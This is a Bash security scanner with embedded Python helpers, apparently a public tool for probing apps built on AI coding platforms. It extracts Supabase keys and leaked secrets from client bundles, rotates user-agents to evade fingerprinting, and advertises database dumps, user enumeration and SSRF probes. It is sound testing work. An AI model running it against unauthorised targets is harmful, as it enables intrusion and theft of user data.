#!/usr/bin/env bash
# =============================================================================
#  ACADILOVABLE — Vibe-Coding Platform Security Scanner
#
#  Autor:     Thiago Muniz
#  LinkedIn:  https://www.linkedin.com/in/tmtic/
#  Instagram: https://www.instagram.com/eutmtic
#  GitHub:    https://github.com/tmtic/acadilovable
#
#  Plataformas: Lovable · v0.dev · Bolt.new · Replit · Cursor · Windsurf
#               Claude Code · GPT-Pilot · Devin · Aider · GitHub Copilot
#               Plandex · Melty · AllHands · Sourcegraph Cody · Amazon Q
#
#  Backends:    Supabase · Firebase · Convex · PocketBase · Neon · Express
#               FastAPI · Flask · Django · Hono · Prisma · Drizzle · tRPC
#
#  Padroes:     OWASP Top 10 (2021) · OWASP WSTG · MITRE ATT&CK · CVSS v3.1
# =============================================================================

# ── Safe error mode: unset-var check ON, errexit OFF (we handle errors explicitly)
set -uo pipefail

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
RED='\033[0;31m'   LRED='\033[1;31m'  GREEN='\033[0;32m'  LGREEN='\033[1;32m'
YELLOW='\033[1;33m' CYAN='\033[0;36m' MAGENTA='\033[0;35m' BLUE='\033[0;34m'
BOLD='\033[1m'      DIM='\033[2m'     NC='\033[0m'

# ─────────────────────────────────────────────────────────────────────────────
# GLOBALS
# ─────────────────────────────────────────────────────────────────────────────
APP_URL=""    DOMAIN=""      OUT_DIR=""    PYDIR=""
SUPABASE=""   ANON_KEY=""    BUNDLE=""
FINDINGS=""   ENDPOINTS=""   SCHEMA=""     DBDUMP=""
USERSF=""     CRAWLF=""      SENSF=""      CURLF=""
REPORTF=""    PLATFORM_JSON=""

TIMEOUT=12
# Realistic browser User-Agents — rotated per session to avoid tool fingerprinting
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0"
)
UA="${UA_LIST[$(( RANDOM % ${#UA_LIST[@]} ))]}"

# Scan flags
SKIP_DL=false        NO_PROBE=false     FULL=false          QUIET=false
VERBOSE=false        JSON_OUT=false     DETECT_ONLY=false
ENABLE_INJECTION=false  ENABLE_SSRF=false  AGGRESSIVE=false
PROFILE="standard"   # quick | standard | full
CUSTOM_OUT=""

# Counters & collections
VULN_COUNT=0
declare -a VULNS=()   MCFGS=()
declare -a TABLES=()  RPCS=()   EDGES=()    BUCKETS=()   CHANNELS=()
declare -a ROUTES=()  APICALLS=() ALLEPS=() SWAGGERSRC=()
declare -a CRAWLED=() SENSFOUND=()

# Timing
SCAN_START=0

# Temp file tracker
declare -a TMPFILES=()

# ─────────────────────────────────────────────────────────────────────────────
# TRAP & CLEANUP
# ─────────────────────────────────────────────────────────────────────────────
_cleanup() {
    rm -f "${TMPFILES[@]}" 2>/dev/null || true
    rm -f /tmp/acadi_$$_*.py /tmp/acadi_$$_*.json 2>/dev/null || true
}
_on_int() { echo ""; warn "Interrupted — results in: ${OUT_DIR:-output/}"; _cleanup; exit 130; }

trap '_cleanup'  EXIT
trap '_on_int'   INT TERM

mktmp() { local f; f=$(mktemp "/tmp/acadi_$$_XXXXXX"); TMPFILES+=("$f"); echo "$f"; }

# ─────────────────────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────────────────────
info()    { $QUIET && return 0; echo -e "${CYAN}[*]${NC} $*"; }
ok()      { $QUIET && return 0; echo -e "${LGREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
err()     { echo -e "${LRED}[-]${NC} $*" >&2; }
verb()    { $VERBOSE && echo -e "${DIM}    $*${NC}"; return 0; }
vuln()    {
    echo -e "${RED}[VULN]${NC} ${BOLD}$*${NC}"
    VULN_COUNT=$((VULN_COUNT+1)); VULNS+=("$*")
    [[ -n "${FINDINGS:-}" ]] && echo "VULN: $*" >> "$FINDINGS"
}
mcfg()    {
    $QUIET || echo -e "${YELLOW}[MISCONFIG]${NC} $*"
    MCFGS+=("$*")
    [[ -n "${FINDINGS:-}" ]] && echo "MISCONFIG: $*" >> "$FINDINGS"
}
log()     { [[ -n "${FINDINGS:-}" ]] && echo "$*" >> "$FINDINGS"; return 0; }
section() {
    $QUIET && { echo -e "${BOLD}[ $* ]${NC}"; return 0; }
    printf "\n${MAGENTA}${BOLD}%s\n  %s\n%s${NC}\n" \
        "════════════════════════════════════════════════════════" \
        "$*" \
        "════════════════════════════════════════════════════════"
}
step() {
    local n="${1}"; local label="${2}"
    local elapsed=$(( $(date +%s) - ${SCAN_START:-$(date +%s)} ))
    local m=$(( elapsed/60 )) s=$(( elapsed%60 ))
    printf "\n${MAGENTA}${BOLD}┌──────────────────────────────────────────────────────────┐\n"
    printf "│  PHASE %-2s  %-46s│\n" "${n}" "${label}"
    printf "│  Elapsed: %02d:%02d%47s│\n" "${m}" "${s}" ""
    printf "└──────────────────────────────────────────────────────────┘${NC}\n"
}

banner() {
    local CYAN='\033[0;36m' BOLD='\033[1m' DIM='\033[2m' NC='\033[0m'
    echo ""
    echo -e "${BOLD}${CYAN}  ACADILOVABLE${NC}  —  Vibe-Coding Platform Security Scanner"
    echo -e "  ${DIM}──────────────────────────────────────────────────────────────────${NC}"
    echo -e "  Lovable  v0.dev  Bolt.new  Replit  Cursor  Windsurf  Claude Code"
    echo -e "  GPT-Pilot  Devin  Aider  GitHub Copilot  Plandex  AllHands  Cody"
    echo -e "  ${DIM}──────────────────────────────────────────────────────────────────${NC}"
    echo -e "  Autor: Thiago Muniz  |  github.com/tmtic/acadilovable"
    echo ""
}

# ─────────────────────────────────────────────────────────────────────────────
# USAGE / HELP
# ─────────────────────────────────────────────────────────────────────────────
usage() {
    cat << 'HELPEOF'
USAGE:
  acadilovable.sh -u <URL> [OPTIONS]

TARGET:
  -u, --url <URL>         Application URL to scan (required)

SCAN PROFILES:
  --quick                 Passive only: no active HTTP probing (fastest)
  --full                  Deep scan: extended crawl, all rows, write tests
  (default)               Standard: all phases, balanced depth

SCAN CONTROL:
  --skip-download         Reuse previously downloaded JS assets
  --no-probe              Skip all active HTTP probing
  --timeout <sec>         Per-request timeout (default: 12)
  --detect                Only detect if app was built with vibe-coding (fast)
  --enable-injection      Enable injection tests: SQLi, NoSQLi, SSTI, CMDi
                          (disabled by default — can generate noise/alerts)
  --enable-ssrf           Enable SSRF tests against internal metadata endpoints
                          (disabled by default — generates outbound requests)
  --aggressive            Enable all: --enable-injection --enable-ssrf --full

OUTPUT:
  -q, --quiet             Show only vulnerabilities and final summary
  -v, --verbose           Show debug detail for every test
  --json                  Write machine-readable summary to scan.json
  --out <dir>             Custom output directory

DEPENDENCY MANAGEMENT:
  --check-deps            Check if all prerequisites are installed
  --install-deps          Auto-install missing prerequisites (detects OS)
  --validate [dir]        Gera validate_findings.sh de um scan anterior
                          Sem [dir]: usa o scan mais recente em output/

HELP:
  -h, --help              Show this help

WHAT IT SCANS:
  Platform Detection      React/Next.js/Vue · Supabase/Firebase/Convex/PocketBase
                          Vercel/Netlify/Railway · Prisma/Drizzle · Clerk/Auth0

  Discovery               JS bundle (sw.js precache → index.html fallback)
                          Web crawler (depth 3-5), 70+ sensitive file paths
                          PostgREST/GraphQL/Swagger schema extraction

  Static Analysis         JWT decode · alg=none · service_role leak
                          Hardcoded secrets (Stripe, AWS, OpenAI, Firebase...)
                          Env var leaks in client bundle · source maps

  Active Tests:
  ├─ Firebase             Firestore public read · RTDB open · Storage listing
  │                       Weak password policy · email enumeration
  ├─ Next.js/Vercel       /_next/data/ enumeration · env leaks · Server Actions
  │                       NextAuth exposure · tRPC unauthenticated calls
  ├─ Convex               Function enumeration · unauthenticated calls
  ├─ Supabase             RLS bypass · OR filter · IDOR · JWT attacks
  │                       CSV export · rate limit · method override
  ├─ GraphQL              Introspection · depth DoS · batch DoS · SQLi
  ├─ API Fuzzing          50+ common paths · IDOR · PII in responses
  ├─ Injection (A03)      SQLi · NoSQLi · SSTI · CMDi · XSS probe
  ├─ SSRF (A10)           AWS/GCP/Azure metadata · internal services
  ├─ Path Traversal       Directory traversal in file/path parameters
  ├─ Security Headers     CSP · HSTS · CORS · X-Frame · Cookies · SRI
  └─ OWASP Top 10         A01–A10 with CVSS scores, MITRE ATT&CK, WSTG IDs

OUTPUTS  (saved to output/<domain>/):
  report.html             Full interactive dashboard (dark, filterable)
  findings.txt            All VULN/MISCONFIG findings (machine-readable)
  owasp.json              OWASP findings with CVSS + MITRE + WSTG
  platform.json           Detected tech stack fingerprint
  endpoints.txt           METHOD|URL|SOURCE|TAG for every endpoint
  db_dump.json            Extracted database table data
  users.json              User data found during enumeration
  crawl.json              All crawled URLs with status + content-type
  sensitive_files.json    Accessible sensitive file paths + content preview
  curl_commands.sh        Ready-to-run curl for every endpoint
  scan.json               Machine summary (--json flag)

EXAMPLES:
  # Lovable/Supabase app
  acadilovable.sh -u https://myapp.lovable.app

  # v0.dev / Vercel / Next.js app
  acadilovable.sh -u https://myapp.vercel.app

  # Bolt.new / Firebase app
  acadilovable.sh -u https://myapp.web.app

  # Replit app (any stack)
  acadilovable.sh -u https://myapp.replit.app

  # Passive discovery only (safe, no writes)
  acadilovable.sh -u https://target.com --quick

  # Full deep scan with JSON output
  acadilovable.sh -u https://target.com --full --json

  # Re-scan existing output quietly
  acadilovable.sh -u https://target.com --skip-download --quiet

  ⚠  For authorized security testing only.

HELPEOF
    exit 0
}

# ─────────────────────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# DEPENDENCY MANAGEMENT
# ─────────────────────────────────────────────────────────────────────────────
REQUIRED_DEPS=(curl python3 grep sed awk)
OPTIONAL_DEPS=(jq git)

_detect_os() {
    if   [[ -f /etc/debian_version ]] || grep -qi "ubuntu\|debian" /etc/os-release 2>/dev/null; then echo "debian"
    elif [[ -f /etc/redhat-release ]] || grep -qi "rhel\|centos\|fedora" /etc/os-release 2>/dev/null; then echo "redhat"
    elif [[ -f /etc/arch-release ]]   || grep -qi "arch" /etc/os-release 2>/dev/null; then echo "arch"
    elif [[ "$(uname -s)" == "Darwin" ]]; then echo "macos"
    elif grep -qi "alpine" /etc/os-release 2>/dev/null; then echo "alpine"
    else echo "unknown"
    fi
}

_pkg_install() {
    local os="$1"; shift; local pkgs=("$@")
    case "$os" in
        debian)  sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y "${pkgs[@]}" ;;
        redhat)  command -v dnf &>/dev/null && sudo dnf install -y "${pkgs[@]}" || sudo yum install -y "${pkgs[@]}" ;;
        arch)    sudo pacman -Sy --noconfirm "${pkgs[@]}" ;;
        macos)
            if ! command -v brew &>/dev/null; then
                err "Homebrew not found. Install from https://brew.sh"
                return 1
            fi
            brew install "${pkgs[@]}" ;;
        alpine)  sudo apk add --no-cache "${pkgs[@]}" ;;
        *)       err "Could not detect package manager. Install manually: ${pkgs[*]}"; return 1 ;;
    esac
}

check_deps() {
    local miss=()
    for c in "${REQUIRED_DEPS[@]}"; do
        command -v "$c" &>/dev/null || miss+=("$c")
    done
    if [[ ${#miss[@]} -gt 0 ]]; then
        err "Missing required dependencies: ${miss[*]}"
        err "Run: $0 --install-deps"
        return 1
    fi
    return 0
}

check_deps_verbose() {
    local os; os=$(_detect_os)
    echo ""
    echo "  ACADILOVABLE — Dependency Check"
    echo "  ─────────────────────────────────"
    echo "  OS detected: ${os}"
    echo ""
    echo "  Required:"
    local all_ok=true
    for dep in "${REQUIRED_DEPS[@]}"; do
        if command -v "$dep" &>/dev/null; then
            local ver; ver=$("$dep" --version 2>&1 | head -1 | grep -oP '\d+[.\d]+' | head -1 || echo "ok")
            printf "    %-12s  OK  (%s)\n" "$dep" "$ver"
        else
            printf "    %-12s  MISSING\n" "$dep"
            all_ok=false
        fi
    done
    echo ""
    echo "  Optional:"
    for dep in "${OPTIONAL_DEPS[@]}"; do
        if command -v "$dep" &>/dev/null; then
            local ver; ver=$("$dep" --version 2>&1 | head -1 | grep -oP '\d+[.\d]+' | head -1 || echo "ok")
            printf "    %-12s  OK  (%s)\n" "$dep" "$ver"
        else
            printf "    %-12s  not installed (optional)\n" "$dep"
        fi
    done
    echo ""
    if $all_ok; then
        echo "  All required dependencies are installed."
        return 0
    else
        echo "  Run: $0 --install-deps   to install missing packages"
        return 1
    fi
}

install_deps() {
    local os; os=$(_detect_os)
    echo ""
    echo "  ACADILOVABLE — Dependency Installer"
    echo "  ─────────────────────────────────────"
    echo "  Detected OS: ${os}"
    echo ""

    local missing=()
    for dep in "${REQUIRED_DEPS[@]}" "${OPTIONAL_DEPS[@]}"; do
        command -v "$dep" &>/dev/null || missing+=("$dep")
    done

    if [[ ${#missing[@]} -eq 0 ]]; then
        echo "  All dependencies already installed."
        return 0
    fi

    echo "  Missing: ${missing[*]}"
    echo "  Installing..."
    echo ""

    # Map command names to package names per OS
    local -A pkg_map_debian=([python3]="python3" [curl]="curl" [grep]="grep"
                              [sed]="sed" [awk]="gawk" [jq]="jq" [git]="git")
    local -A pkg_map_redhat=([python3]="python3" [curl]="curl" [grep]="grep"
                              [sed]="sed" [awk]="gawk" [jq]="jq" [git]="git")
    local -A pkg_map_macos=([python3]="python3" [curl]="curl" [grep]="grep"
                             [sed]="gnu-sed" [awk]="gawk" [jq]="jq" [git]="git")
    local -A pkg_map_arch=([python3]="python" [curl]="curl" [grep]="grep"
                            [sed]="sed" [awk]="gawk" [jq]="jq" [git]="git")
    local -A pkg_map_alpine=([python3]="python3" [curl]="curl" [grep]="grep"
                              [sed]="sed" [awk]="gawk" [jq]="jq" [git]="git")

    local pkgs_to_install=()
    for dep in "${missing[@]}"; do
        local pkg=""
        case "$os" in
            debian)  pkg="${pkg_map_debian[$dep]:-$dep}" ;;
            redhat)  pkg="${pkg_map_redhat[$dep]:-$dep}" ;;
            macos)   pkg="${pkg_map_macos[$dep]:-$dep}"  ;;
            arch)    pkg="${pkg_map_arch[$dep]:-$dep}"   ;;
            alpine)  pkg="${pkg_map_alpine[$dep]:-$dep}" ;;
            *)       pkg="$dep" ;;
        esac
        pkgs_to_install+=("$pkg")
    done

    if _pkg_install "$os" "${pkgs_to_install[@]}"; then
        echo ""
        echo "  Installation complete. Verifying..."
        echo ""
        check_deps_verbose
    else
        err "Installation failed. Please install manually:"
        err "  ${pkgs_to_install[*]}"
        return 1
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# ARG PARSING
# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# STANDALONE VALIDATE — gera o script de validação de um scan anterior
# ─────────────────────────────────────────────────────────────────────────────
_run_validate_standalone() {
    local scan_dir="${1:-}"
    local script_dir
    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || script_dir="$(pwd)"

    # Se não passou diretório, tenta descobrir o mais recente
    if [[ -z "$scan_dir" ]]; then
        scan_dir=$(ls -td output/*/ 2>/dev/null | head -1)
        [[ -z "$scan_dir" ]] && { err "Nenhum scan encontrado. Use: $0 --validate output/<dominio>/"; return 1; }
        info "Usando scan mais recente: $scan_dir"
    fi

    [[ ! -d "$scan_dir" ]] && { err "Diretório não encontrado: $scan_dir"; return 1; }

    local findings="${scan_dir}/findings.txt"
    local endpoints="${scan_dir}/endpoints.txt"
    local gen_py="${scan_dir}/py/gen_validate.py"
    local app_url
    app_url=$(grep "^SUPABASE_URL=" "$findings" 2>/dev/null | head -1 | cut -d= -f2 || true)
    # tenta pegar o app url do diretório
    [[ -z "$app_url" ]] && app_url=$(basename "$scan_dir" | tr '_' '.' | sed 's/\.\././g')

    [[ ! -f "$findings"  ]] && { err "findings.txt não encontrado em $scan_dir"; return 1; }
    [[ ! -f "$gen_py"    ]] && { err "gen_validate.py não encontrado em $scan_dir/py/"; return 1; }

    local out_validate="${script_dir}/validate_findings.sh"
    info "Gerando: $out_validate"
    info "Fonte:   $findings"

    python3 "$gen_py" "$findings" "$endpoints" "$scan_dir" "${APP_URL:-$app_url}" "$out_validate"
    local rc=$?
    if [[ $rc -eq 0 && -f "$out_validate" ]]; then
        chmod +x "$out_validate"
        ok "validate_findings.sh → $out_validate"
        info "Execute: bash validate_findings.sh"
        # Também copia para o scan_dir
        cp "$out_validate" "${scan_dir}/validate_findings.sh" 2>/dev/null || true
    else
        err "Falha ao gerar (exit $rc)"
        return 1
    fi
}


parse_args() {
    [[ $# -eq 0 ]] && usage

    # Fast-path for help and validate before the main case loop
    for _arg in "$@"; do
        [[ "$_arg" == "-h" || "$_arg" == "--help" ]] && usage
    done
    # --validate fast-path: needs access to other args so handle here
    if [[ "${1:-}" == "--validate" ]]; then
        banner
        _run_validate_standalone "${2:-}"
        exit $?
    fi

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--url)         APP_URL="${2%/}"; shift 2 ;;
            --skip-download)  SKIP_DL=true; shift ;;
            --no-probe)       NO_PROBE=true; shift ;;
            --full)           FULL=true; PROFILE="full"; shift ;;
            --quick)          PROFILE="quick"; NO_PROBE=true; shift ;;
            -q|--quiet)       QUIET=true; shift ;;
            -v|--verbose)     VERBOSE=true; shift ;;
            --json)           JSON_OUT=true; shift ;;
            --out)            CUSTOM_OUT="$2"; shift 2 ;;
            --timeout)        TIMEOUT="$2"; shift 2 ;;
            --check-deps)        check_deps_verbose; exit $? ;;
            --install-deps)      install_deps; exit $? ;;
            --detect)            DETECT_ONLY=true; shift ;;

            --enable-injection)  ENABLE_INJECTION=true; shift ;;
            --enable-ssrf)       ENABLE_SSRF=true; shift ;;
            --aggressive)        ENABLE_INJECTION=true; ENABLE_SSRF=true; FULL=true; shift ;;
            -h|--help)           usage ;;
            *)  err "Unknown option: $1"; echo "Run with --help for usage."; exit 1 ;;
        esac
    done

    [[ -z "$APP_URL" ]] && { err "No URL. Use -u <URL>"; exit 1; }
    echo "$APP_URL" | grep -qP '^https?://' || { err "URL must start with http:// or https://"; exit 1; }

    DOMAIN=$(echo "$APP_URL" | sed 's|https\?://||' | tr '/:?=&#' '______' | cut -c1-80)
    OUT_DIR="${CUSTOM_OUT:-output/${DOMAIN}}"
    PYDIR="${OUT_DIR}/py"
    FINDINGS="${OUT_DIR}/findings.txt"
    ENDPOINTS="${OUT_DIR}/endpoints.txt"
    SCHEMA="${OUT_DIR}/schema.json"
    DBDUMP="${OUT_DIR}/db_dump.json"
    USERSF="${OUT_DIR}/users.json"
    CRAWLF="${OUT_DIR}/crawl.json"
    SENSF="${OUT_DIR}/sensitive_files.json"
    CURLF="${OUT_DIR}/curl_commands.sh"
    REPORTF="${OUT_DIR}/report.html"
    PLATFORM_JSON="${OUT_DIR}/platform.json"

    mkdir -p "$OUT_DIR" "$PYDIR" || { err "Cannot create output dir: $OUT_DIR"; exit 1; }
    : > "$FINDINGS"

    [[ "$PROFILE" == "quick" ]] && TIMEOUT="${TIMEOUT:-8}"
    [[ "$PROFILE" == "full"  ]] && TIMEOUT="${TIMEOUT:-20}"
    TIMEOUT="${TIMEOUT:-12}"
}


# ─────────────────────────────────────────────────────────────────────────────
# HTTP HELPERS — all null-byte safe, all error-tolerant
# ─────────────────────────────────────────────────────────────────────────────
hget() {
    curl -sS --max-time "$TIMEOUT" -A "$UA" -L \
         -H "Accept: */*" --connect-timeout 8 "$1" \
         2>/dev/null | tr -d '\000' || true
}
hhead() {
    curl -sS --max-time "$TIMEOUT" -A "$UA" -I "$1" \
         2>/dev/null | tr -d '\000' || true
}
hstatus() {
    curl -o /dev/null -sS --max-time "$TIMEOUT" -A "$UA" \
         -w "%{http_code}" "$1" 2>/dev/null || echo "000"
}
# Returns STATUS|||BODY
hprobe() {
    local method="${1:-GET}" url="$2" xhdr="${3:-}" body="${4:-}" auth="${5:-yes}"
    local tmp; tmp=$(mktmp)
    local cmd=(curl -sS --max-time "$TIMEOUT" -A "$UA" -o "$tmp"
               -w "%{http_code}" -X "$method" -H "Accept: application/json")
    case "$auth" in
        yes) cmd+=(-H "apikey: ${ANON_KEY:-}" -H "Authorization: Bearer ${ANON_KEY:-}") ;;
        no)  : ;;
        bad) cmd+=(-H "apikey: invalid_acadi" -H "Authorization: Bearer invalid_acadi") ;;
    esac
    [[ -n "$xhdr"  ]] && cmd+=(-H "$xhdr")
    [[ -n "$body"  ]] && cmd+=(-H "Content-Type: application/json" -d "$body")
    cmd+=("$url")
    local st; st=$("${cmd[@]}" 2>/dev/null) || st="000"
    local bd;  bd=$(cat "$tmp" 2>/dev/null | tr -d '\000') || bd=""
    printf '%s|||%s' "$st" "$bd"
}
hprobe_no()  { hprobe "$1" "$2" "" "" "no";  }
hprobe_bad() { hprobe "$1" "$2" "" "" "bad"; }


# ─────────────────────────────────────────────────────────────────────────────
# PYTHON HELPER GENERATION  (all in .py files — zero inline python3 -c)
# ─────────────────────────────────────────────────────────────────────────────
write_python_helpers() {
    # ── sw.js precache parser ──────────────────────────────────────────────
    cat > "${PYDIR}/precache.py" << 'ACADI_PYEOF'
import sys, re, json
c = sys.stdin.read()
m = re.search(r'precacheAndRoute\((\[.*?\])', c, re.DOTALL)
if not m: sys.exit(1)
raw = m.group(1)
raw = re.sub(r'([{,])\s*(\w+)\s*:', r'\1"\2":', raw)
raw = re.sub(r',\s*([}\]])', r'\1', raw)
try:
    for e in json.loads(raw):
        u = e.get('url', '')
        if u: print(u)
except Exception:
    sys.exit(1)
ACADI_PYEOF

    # ── index.html asset extractor ─────────────────────────────────────────
    cat > "${PYDIR}/idx.py" << 'ACADI_PYEOF'
import sys, re
c = sys.stdin.read()
seen = set()
for m in re.finditer(r'(?:src|href)=["\']([^"\'`\s]+)["\']', c):
    u = m.group(1)
    if '/assets/' in u and u not in seen:
        seen.add(u)
        print(u.lstrip('/'))
ACADI_PYEOF

    # ── bundle extractor ───────────────────────────────────────────────────
    cat > "${PYDIR}/extract.py" << 'ACADI_PYEOF'
import sys, re, json, collections
mode = sys.argv[1] if len(sys.argv) > 1 else "all"
c = sys.stdin.read()

def uniq(lst):
    seen = set(); out = []
    for x in lst:
        k = str(x)
        if k not in seen: seen.add(k); out.append(x)
    return out

def norm(p):
    p = re.sub(r'\$\{[^}]+\}', '{id}', p)
    p = re.sub(r':([a-zA-Z_]\w*)', r'{\1}', p)
    return p

def supabase_url(c):
    m = re.search(r'https?://[a-z0-9\-]+\.supabase\.co', c)
    return m.group(0) if m else ''

def anon_key(c):
    m = re.search(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', c)
    return m.group(0) if m else ''

def tables(c):
    return sorted(set(re.findall(r'\.from\(["\']([a-zA-Z_]\w*)["\']', c)))

def rpcs(c):
    return sorted(set(re.findall(r'\.rpc\(["\']([a-zA-Z_]\w*)["\']', c)))

def edges(c):
    return sorted(set(re.findall(r'supabase\.co/functions/v1/([^"\'`\s/]+)', c)))

def buckets(c):
    return sorted(set(re.findall(r'\.storage\.from\(["\']([a-zA-Z0-9_\-]+)["\']', c)))

def chains(c):
    out = []
    from_re = re.compile(
        r'\.from\(["\']([a-zA-Z_]\w*)["\']'
        r'\)((?:\s*\.[a-zA-Z]+\([^)]{0,200}\)){1,12})', re.DOTALL)
    for m in from_re.finditer(c):
        tbl = m.group(1); chain = m.group(2)
        op = 'select'
        for o in ['insert','upsert','update','delete']:
            if '.' + o + '(' in chain: op = o; break
        sel = re.search(r'\.select\(["\']([^"\']{0,200})["\']', chain)
        cols = [x.strip() for x in sel.group(1).split(',')] if sel else []
        filts = re.findall(r'\.(eq|neq|gt|lt|like|ilike|is|in)\(["\']([^"\']+)', chain)
        has_rls = any(f[1] in ('user_id','id','owner_id','created_by') for f in filts)
        out.append({'table':tbl,'op':op,'cols':cols,'filters':filts,'has_rls':has_rls})
    return uniq(out)

def auth_calls(c):
    methods = set(re.findall(r'(?:supabase|client|sb)\.auth\.(\w+)\(', c))
    admin   = set(re.findall(r'\.auth\.admin\.(\w+)\(', c))
    return {'methods': sorted(methods), 'admin': sorted(admin)}

def routes(c):
    out = set()
    for p in [r'path\s*[:=]\s*["\'](/[^"\'<>\s{][^"\'<>\s]*)["\']',
              r'<Route[^>]+path=["\'](/[^"\'<>\s]+)["\']',
              r'(?:navigate|push|replace)\s*\(["\'](/[^"\'<>\s]+)["\']',
              r'\bto\s*=\s*["\'](/[^"\'<>\s#?&]+)["\']']:
        for m in re.finditer(p, c):
            r = norm(m.group(1))
            if len(r)>1 and not re.search(r'\.(js|css|png|jpg|svg|ico|woff|ttf)$',r):
                out.add(r)
    return sorted(out)

def api_calls(c):
    calls = collections.defaultdict(set)
    for m in re.finditer(r'fetch\(["\']((https?://[^"\']+)?/[^"\'<>\s]{2,})["\'](?:\s*,\s*\{([^}]{0,200})\})?', c, re.DOTALL):
        path = norm(m.group(1)); opts = m.group(3) or ''
        mm = re.search(r'method\s*:\s*["\']([A-Z]+)["\']', opts)
        calls[path].add(mm.group(1) if mm else 'GET')
    for m in re.finditer(r'axios\.(get|post|put|patch|delete)\(["\']((https?://[^"\']+)?/[^"\'<>\s]{2,})["\']', c):
        calls[norm(m.group(2))].add(m.group(1).upper())
    return [{'path':p,'methods':sorted(ms)} for p,ms in sorted(calls.items())]

def secrets(c):
    found = []
    patterns = [
        ('Stripe-live',    r'sk_live_[A-Za-z0-9]{24,}'),
        ('Stripe-test',    r'sk_test_[A-Za-z0-9]{24,}'),
        ('OpenAI',         r'sk-[a-zA-Z0-9]{48}'),
        ('Anthropic',      r'sk-ant-[a-zA-Z0-9\-_]{95,}'),
        ('AWS-Key',        r'AKIA[0-9A-Z]{16}'),
        ('GitHub-Token',   r'ghp_[A-Za-z0-9]{36}'),
        ('Firebase',       r'AIza[0-9A-Za-z\-_]{35}'),
        ('SendGrid',       r'SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}'),
        ('Twilio',         r'AC[a-f0-9]{32}'),
        ('Resend',         r're_[a-zA-Z0-9]{24,}'),
        ('Mapbox',         r'pk\.eyJ[A-Za-z0-9\.]+'),
    ]
    for svc, pat in patterns:
        for m in re.finditer(pat, c):
            found.append({'service': svc, 'value': m.group(0)[:40]})
    return found

def env_refs(c):
    all_refs = re.findall(r'process\.env\.([A-Z_]{3,})|import\.meta\.env\.([A-Z_]{3,})', c)
    flat = [a or b for a,b in all_refs]
    risky = [v for v in flat if not v.startswith('NEXT_PUBLIC_') and
             any(s in v for s in ['SECRET','KEY','TOKEN','PASSWORD','DATABASE','PRIVATE','SALT'])]
    return {'all': sorted(set(flat)), 'risky': sorted(set(risky))}

out = {}
if mode in ('all','config'):
    out['supabase_url'] = supabase_url(c)
    out['anon_key']     = anon_key(c)
if mode in ('all','tables'):   out['tables']   = tables(c)
if mode in ('all','rpcs'):     out['rpcs']     = rpcs(c)
if mode in ('all','edges'):    out['edges']    = edges(c)
if mode in ('all','buckets'):  out['buckets']  = buckets(c)
if mode in ('all','chains'):   out['chains']   = chains(c)
if mode in ('all','auth'):     out['auth']     = auth_calls(c)
if mode in ('all','routes'):   out['routes']   = routes(c)
if mode in ('all','api'):      out['api']      = api_calls(c)
if mode in ('all','secrets'):  out['secrets']  = secrets(c)
if mode in ('all','env'):      out['env']      = env_refs(c)
print(json.dumps(out, indent=2))
ACADI_PYEOF

    # ── platform detector ──────────────────────────────────────────────────
    cat > "${PYDIR}/platform.py" << 'ACADI_PYEOF'
import sys, re, json, urllib.request, urllib.error

url     = sys.argv[1] if len(sys.argv) > 1 else ""
bfile   = sys.argv[2] if len(sys.argv) > 2 else ""
hfile   = sys.argv[3] if len(sys.argv) > 3 else ""

bundle  = open(bfile).read() if bfile else ""
raw_hdr = open(hfile).read().lower() if hfile else ""
b = bundle

result = {
    "vibe_platform":[], "frontend":[], "backend":[], "orm":[],
    "auth":[], "hosting":[], "api_patterns":[], "credentials":{},
}

# Headers
for sig, k, v in [
    ("x-powered-by: next.js",   "frontend","nextjs"),
    ("server: vercel",           "hosting","vercel"),
    ("x-vercel",                 "hosting","vercel"),
    ("netlify",                  "hosting","netlify"),
    ("fly-request-id",           "hosting","fly.io"),
    ("x-powered-by: express",    "backend","express"),
    ("x-powered-by: php",        "backend","php"),
    ("cf-ray",                   "hosting","cloudflare"),
]:
    if sig in raw_hdr: result[k].append(v)

# Vibe platform
for plat, pats in {
    "lovable":  [r'lovable\.app',r'gptengineer'],
    "bolt":     [r'bolt\.new',r'stackblitz'],
    "v0":       [r'v0\.dev',r'v0-components'],
    "replit":   [r'replit\.com',r'replit\.dev',r'\.repl\.co'],
    "cursor":   [r'cursor\.sh',r'cursor\.so'],
    "windsurf": [r'codeium\.com',r'windsurf'],
    "claude":   [r'claude\.ai',r'anthropic\.com/claude'],
